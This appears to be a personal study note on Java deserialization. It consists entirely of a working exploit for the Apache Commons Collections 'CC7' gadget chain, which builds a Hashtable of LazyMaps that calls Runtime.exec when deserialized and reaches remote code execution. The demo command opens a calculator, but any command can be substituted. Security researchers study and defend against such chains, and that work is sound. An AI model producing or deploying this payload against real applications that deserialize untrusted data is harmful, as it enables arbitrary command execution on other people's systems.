# Payload
```java
package xyz.fe1w0.java.basic.serialize.cc.seven;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.HashedMap;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Hashtable;
import java.util.Map;

import static xyz.fe1w0.java.basic.serialize.cc.two.Exploit.setFieldValue;

public class Exploit {

    public static void main(String[] args) throws Exception {
        String command = "open -a calculator";
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{command})
        };

        Transformer fakeTransformer = new ConstantTransformer("fe1w0");

        Transformer chainTransformer = new ChainedTransformer(new Transformer[] {
                fakeTransformer
        });


        Map mapOne = LazyMap.decorate(new HashedMap(), chainTransformer);
        Map mapTwo = LazyMap.decorate(new HashedMap(), chainTransformer);

        // 使数据满足 后续的判断条件:
        mapOne.put(1, 1);
        mapTwo.put(2, 2);

        System.out.println(mapOne.hashCode());
        System.out.println(mapTwo.hashCode());


        // map.equals 直接触发利用链
        System.out.println(mapOne.equals(mapTwo));;

        // 使用 Hashtable
        Hashtable hashtable = new Hashtable();
        // 注意使用 put 的时候，也会调用到 Hashtable#equals
        hashtable.put(mapOne, 1);
        hashtable.put(mapTwo, 2);

        Field iTransformersField = ChainedTransformer.class.getDeclaredField("iTransformers");
        iTransformersField.setAccessible(true);
        iTransformersField.set(chainTransformer, transformers);

        // 确保 hash 冲突？
        mapTwo.remove(1);

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("out/serFile/cc7.ser"));
            outputStream.writeObject(hashtable);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("out/serFile/cc7.ser"));
            inputStream.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }
    }

}
```